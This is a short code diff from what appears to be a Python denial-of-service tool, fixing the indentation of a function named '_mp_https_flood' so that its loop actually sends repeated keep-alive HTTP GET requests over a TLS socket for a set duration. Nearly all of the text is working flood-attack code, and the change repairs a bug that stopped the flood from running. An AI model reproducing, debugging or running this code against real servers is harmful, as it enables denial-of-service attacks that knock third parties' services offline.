@@ -218,26 +218,25 @@ def _mp_https_flood(args_tuple):
             _time.sleep(0.5)
     if ssock is None:
         return 0, 1
-        
-        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
-               f"Connection: keep-alive\r\n"
-               f"User-Agent: dossal/3.16\r\n\r\n").encode()
-        
-        end = _time.time() + duration
-        while _time.time() < end:
-            try:
-                ssock.sendall(req)
-                # Read one response (header + body)
-                data = ssock.recv(65535)
-                if not data:
-                    break
-                sent += 1
-            except Exception:
-                break
+    
+    req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
+           f"Connection: keep-alive\r\n"
+           f"User-Agent: dossal/3.16\r\n\r\n").encode()
+    
+    end = _time.time() + duration
+    while _time.time() < end:
         try:
-            ssock.close()
+            ssock.sendall(req)
+            data = ssock.recv(65535)
+            if not data:
+                break
+            sent += 1
         except Exception:
-            pass
+            break
+    try:
+        ssock.close()
+    except Exception:
+        pass
     return sent, errors
 
 async def https_mp_worker(name, url, stats, duration, stop, payload_size=0):
